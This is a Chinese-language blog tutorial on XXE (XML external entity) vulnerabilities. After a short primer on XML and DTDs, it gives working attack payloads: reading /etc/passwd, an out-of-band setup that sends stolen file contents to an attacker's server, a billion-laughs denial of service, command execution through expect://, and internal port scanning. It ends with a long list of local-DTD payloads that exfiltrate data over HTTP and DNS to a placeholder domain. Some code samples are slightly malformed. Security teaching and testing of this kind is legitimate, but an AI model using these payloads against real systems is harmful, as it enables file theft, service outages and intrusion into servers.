> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZMntzdTsqkDgM8XC7LVLRw)

 **学习 xxe 漏洞到利用 xxe 漏洞**

**从 0 到 1**

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuG4doVHRwYDBKkLmxUeKKqP9KMxg8qz1pxHr3ZAicyRrvks2BV7zKpHChkRwwSh2VibyeAcfgIiaQsA/640?wx_fmt=png)

  

  

第一阶段（浅谈 XML）

初识 XML

一个好的代码基础能帮助你更好理解一类漏洞，所以先学习一下 XML 的基础知识。

XML 被设计为传输和存储数据，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具，简单来说 XML 主要是面向传输的。

什么是 XML？

    XML 指可扩展标记语言（EXtensible Markup Language）

    XML 是一种标记语言，很类似 HTML

    XML 的设计宗旨是传输数据，而非显示数据

    XML 标签没有被预定义。您需要自行定义标签

    XML 被设计为具有自我描述性

    XML 是 W3C 的推荐标准

与 HTML 的对比

    XML 不是 HTML 的替代

    XML 和 HTML 为不同的目的而设计

    XML 被设计为传输和存储数据，其焦点是数据的内容

    HTML 被设计用来显示数据，其焦点是数据的外观

    HTML 旨在显示信息，而 XML 旨在传输信息

XML 文档结构

XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。

请看示例：

```
<!--XML申明-->
<?xml version="1.0"?>
<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>wecome</to>
<from>to</from>
<head>This wave is hacker</head>
<body>You are a good hacker</body>
</note>
```

DTD：

文档类型定义（DTD）可定义合法的 XML 文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中（内部引用），也可作为一个外部引用。

    DTD 文档中有很多重要的关键字如下：

        o DOCTYPE（DTD 的声明）

        o ENTITY（实体的声明）

        o SYSTEM、PUBLIC（外部资源申请）

可以用如下语法引入外部 DTD

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

可以用如下语法引用内部 DTD

```
<!DOCTYPE 根元素 [元素声明]>
```

实体：

实体可以理解为变量，其必须在 DTD 中定义申明，可以在文档中的其他位置引用该变量的值。

实体按类型主要分为以下四种：

        o 内置实体 (Built-in entities)

        o 字符实体 (Character entities)

        o 通用实体 (General entities)

        o 参数实体 (Parameter entities)

当然，如果实体根据引用方式，还可分为内部实体与外部实体。

完整的实体类别可参考 DTD - Entities

四种实体引用实例

内部实体：

```
<!ENTITY 实体名称 "实体的值">
<!ENTITY 实体名称 SYSTEM "URI">
```

参数实体：

```
<!ENTITY % 实体名称 "实体的值">
<!ENTITY % 实体名称 "实体的值">
```

参数实体外实体 + 内部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY name "nMask">]>
<foo>
        <value>&name;</value>
</foo>
```

参数实体 + 外部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY % name SYSTEM "file:///etc/passwd">
    %name;
]>
```

注意：%name（参数实体）是在 DTD 中被引用的，而 & name（其余实体）是在 xml 文档中被引用的。

由于 xxe 漏洞主要是利用了 DTD 引用外部实体导致的漏洞，所以我们特别来分析外部实体

外部实体

定义

```
<!ENTITY 实体名称 SYSTEM "URI">
```

通过 url 可以引用哪些类型的外部实体？当然不同的程序语言，所支持的协议是不一样的

对照表：

案例演示：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE A [
    <!ENTITY Config SYSTEM "file:///etc/passwd">]>
<foo>
        <value>&Config;</value>
</foo>
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuG4doVHRwYDBKkLmxUeKKqP9KMxg8qz1pxHr3ZAicyRrvks2BV7zKpHChkRwwSh2VibyeAcfgIiaQsA/640?wx_fmt=png)

  

  

第二阶段（浅谈 xxe 漏洞)

XXE 漏洞介绍：

XXE 漏洞全称 XML External Entity Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起 dos 攻击等危害。xxe 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传恶意 xml 文件。此类攻击可能包括使用 file：方案或系统标识符中的本地路径公开本地文件，其中可能包含敏感数据，例如密码或私人用户数据。由于此类攻击是相对于处理 XML 文档的应用程序而发生的，因此攻击者可能会使用此受信任的应用程序转到其他内部系统，可能通过 http(s) 请求公开其他内部内容或启动 CSRF 攻击任何不受保护的内部服务。在某些情况下，可以通过取消引用恶意 URI 来利用容易受到客户端内存损坏问题影响的 XML 处理器库，从而可能允许在应用程序帐户下执行任意代码。其他攻击可以访问可能不会停止返回数据的本地资源，如果未释放太多线程或进程，也可能会影响应用程序的可用性。

注意：

该应用程序无需显式将响应返回给攻击者，因为它很容易受到信息泄露的影响。攻击者可以利用 DNS 信息通过子域名将数据泄漏到他们控制的 DNS 服务器。

  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuG4doVHRwYDBKkLmxUeKKqP9KMxg8qz1pxHr3ZAicyRrvks2BV7zKpHChkRwwSh2VibyeAcfgIiaQsA/640?wx_fmt=png)

  

  

第三阶段（发现 xxe 漏洞）

通过提交 POST 请求 XML 文件：

注意：

提交一个 POST 请求，请求头加上 Content-type:application/xml

1. 第一步，验证 XML 解析器是否解析和执行我们自定义的 XML 内容

发送 payload

```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY name "hacker">]>    
<root>&name;</root>
```

如果服务器返回包成功解析了 xml 文档

将返回内容为 hacker

2. 第二步，是否支持外部实体的引用。

利用步骤：

1. 自建 web 网站

2. 在测试网站提交 payload

```
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE test [<!ENTITY dtgmlf6ent SYSTEM "http://自己网站ip/文件名">]>  
<GeneralSearch>&test;</GeneralSearch>
```

3. 查看网站返回内容中是否带有自建网站文件中的内容

4. 查看自建服务器访问日志，是否有 DTD 文件等请求

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuG4doVHRwYDBKkLmxUeKKqP9KMxg8qz1pxHr3ZAicyRrvks2BV7zKpHChkRwwSh2VibyeAcfgIiaQsA/640?wx_fmt=png)

  

  

第四阶段（xxe 漏洞利用）

**1. 任意文件读取：**

Payload（有回显）

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root><name>&xxe;</name></root>
```

这里通过外带（OOB）的方法来检测（无回显）

①自建 web 服务器

②创建接受数据的文件 readdata.php

```
<?php  
file_put_contents("passwd.txt", $_GET['file']) ;  
?>
```

③创建 hacker.php 来供外部实体引用

```
<?php  
$xml=<<<EOF  
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % file SYSTEM "file:///etc/passwd">  //被攻击的服务器
<!ENTITY % remote SYSTEM "http://localhost/hacker.xml">  //自建服务器
%remote;
%all;
%send;  
]>  
EOF;  
$data = simplexml_load_string($xml) ;  
echo "<pre>" ;  
print_r($data) ;  
?>
```

④创建 hacker.xml

```
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://localhost/readdata.php?file=%file;'>">
```

 、

当访问 http://localhost/hacker.php, 存在漏洞的服务器会读出 / etc/passwd 内容，发送给攻击者服务器上的 hacker.php，然后把读取的数据保存到本地的 passwd.txt 中。

**2. DOS 攻击：**

著名的 “billion laughs” 就是利用了 XXE

通过递归调用

Payload

```
<?xml version="1.0"?>
   <!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

3. 命令执行  

php 安装 expect 扩展可以直接执行系统命令，其他协议也有可能可以执行系统命令。

Payload

```
<?xml version=”1.0″ encoding=”utf-8″?>
<!DOCTYPE XXE
<!ELEMENT name ANY >
<!ENTITY XXE SYSTEM "expect://id" >]>
<root>
<name>&XXE;</name>
</root>
```

4. 端口扫描：

端口开放时会返回报错信息，端口不存在时会无法连接

Payload:

```
<?xml version=”1.0″ encoding=”utf-8″?>
<!DOCTYPE XXE [
<!ELEMENT name ANY >
<!ENTITY XXE SYSTEM "http:/ip:port" >]>
<root>
<name>&XXE;</name
</root>
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuG4doVHRwYDBKkLmxUeKKqP9KMxg8qz1pxHr3ZAicyRrvks2BV7zKpHChkRwwSh2VibyeAcfgIiaQsA/640?wx_fmt=png)

  

  

第五阶段（xxe 爆破表）

```
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x SYSTEM "http://xxe-doctype-system.yourdomain[.]com/"><x />
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x PUBLIC "" "http://xxe-doctype-public.yourdomain[.]com/"><x />
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://xxe-entity-system.yourdomain[.]com/">]><x>&xxe;</x>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x [<!ENTITY xxe PUBLIC "" "http://xxe-entity-public.yourdomain[.]com/">]><x>&xxe;</x>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://xxe-paramentity-system.yourdomain[.]com/">%xxe;]><x/>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x [<!ENTITY % xxe PUBLIC "" "http://xxe-paramentity-public.yourdomain[.]com/">%xxe;]><x/>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xxe-xsi-schemalocation.yourdomain[.]com/"/>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://xxe-xsi-nonamespaceschemalocation.yourdomain[.]com/"/>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:include schemaLocation="http://xxe-xsinclude-schemalocation.yourdomain[.]com/"/></xs:schema>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:include namespace="http://xxe-xsinclude-namespace.yourdomain[.]com/"/></xs:schema>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:import schemaLocation="http://xxe-xsimport-schemalocation.yourdomain[.]com/"/></xs:schema>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:import namespace="http://xxe-xsimport-namespace.yourdomain[.]com/"/></xs:schema>
<?xml-stylesheet href="http://xxe-xml-stylesheet.yourdomain[.]com/"?><x />
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"> <!ENTITY % CIMName '> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-1.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\wmi20.dtd"> <!ENTITY % CIMName '> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-2.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Program Files (x86)\Lotus\Notes\domino.dtd"><!ENTITY % boolean '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-3.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\xwizard.dtd"><!ENTITY % onerrortypes '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-4.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamsa ' <!ENTITY % file SYSTEM "http://exfil-xxe-payload-5.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd"><!ENTITY % URI '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-6.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd"> <!ENTITY % Boolean '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-7.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd"> <!ENTITY % url.attribute.set '> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-8.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"> <!ENTITY % condition 'aaa)> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-9.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"> <!ENTITY % constant 'aaa)> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-10.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/struts/struts-config_1_1.dtd"> <!ENTITY % AttributeName '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-11.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd"> <!ENTITY % AttributeName '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-12.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-4/language-specs/language.dtd"> <!ENTITY % itemattrs '> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-13.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd"> <!ENTITY % n.InProceedings 'aaa)> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-14.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/boostbook/dtd/boostbook.dtd"> <!ENTITY % boost.common.attrib '> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-15.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd"> <!ENTITY % queries 'aaa)> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-16.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd"> <!ENTITY % publicIdentifier '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-17.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/nmap/nmap.dtd"> <!ENTITY % attr_numeric '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-18.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/liteide/liteeditor/kate/language.dtd"> <!ENTITY % commonAttributes '> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-19.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgweather/locations.dtd"> <!ENTITY % name 'aaa)> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-20.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-server-operation.dtd"> <!ENTITY % paramlist-dtd ' <!ENTITY % file SYSTEM "http://exfil-xxe-payload-21.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-paramlist.dtd"> <!ENTITY % array-dtd ' <!ENTITY % file SYSTEM "http://exfil-xxe-payload-22.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docutils/docutils.dtd"> <!ENTITY % measure '(aa) #IMPLIED> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-23.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/dblatex/schema/dblatex-config.dtd"> <!ENTITY % attlist.modname '> <!ENTITY % file SYSTEM "http://exfil-xxe-payload-24.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd"> <!ENTITY % block "xxx" > <!ENTITY % common ' <!ENTITY % file SYSTEM "http://exfil-xxe-payload-25.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd"> <!ENTITY % xs-datatypes ' <!ENTITY % file SYSTEM "http://exfil-xxe-payload-26.yourdomain[.]com"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"> <!ENTITY % CIMName '> <!ENTITY % file "dns-exfil-1"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\wmi20.dtd"> <!ENTITY % CIMName '> <!ENTITY % file "dns-exfil-2"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Program Files (x86)\Lotus\Notes\domino.dtd"><!ENTITY % boolean '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-3"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\xwizard.dtd"><!ENTITY % onerrortypes '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-4"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamsa ' <!ENTITY % file "dns-exfil-5"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd"><!ENTITY % URI '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-6"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd"> <!ENTITY % Boolean '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-7"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd"> <!ENTITY % url.attribute.set '> <!ENTITY % file "dns-exfil-8"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"> <!ENTITY % condition 'aaa)> <!ENTITY % file "dns-exfil-9"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"> <!ENTITY % constant 'aaa)> <!ENTITY % file "dns-exfil-10"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
